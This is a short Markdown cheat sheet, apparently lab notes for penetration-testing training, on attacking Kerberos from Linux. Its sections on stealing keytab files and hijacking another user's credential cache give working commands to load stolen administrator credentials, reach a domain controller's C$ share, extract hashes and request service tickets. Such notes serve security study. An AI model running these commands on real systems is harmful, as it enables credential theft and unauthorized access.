# Kerberos

## General

Connecting using AD credentials

```bash
ssh administrator@domain.com@linux
```

Credential cache file path environment variable

```bash
env | grep KRB5CCNAME
```

Getting a TGT

```bash
kinit
```

Listing current tickets in the user's cache

```bash
klist
```

List SPNs available using Kerberos authentication

{% code overflow="wrap" %}
```bash
ldapsearch -Y GSSAPI -H ldap://dc01.domain.com -D "Administrator@domain.com" -W -b "dc=domain,dc=com" "servicePrincipalName=*" servicePrincipalName
```
{% endcode %}

## Stealing Keytab Files

```bash
# Loading a keytab file
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
# Renewing an expired TGT (if it's within the renewal timeframe)
kinit -R
# Use credentials to access SMB share
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
# Extract hashes from a Keytab file
python3 /home/kali/data/OSEP/Challenge5/keytabextract.py krb5.keytab
```

## Using Credential Cache Files

```bash
# Listing ccache files in /tmp
ls -al /tmp/krb5cc_*
# Copying the ccache file
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
ls -al /tmp/krb5cc_minenow
# Setting our ccache file and listing tickets
kdestroy
klist
export KRB5CCNAME=/tmp/krb5cc_minenow
klist
# Getting service tickets with our stolen ccache file
kvno MSSQLSvc/DC01.corp1.com:1433
klist
```
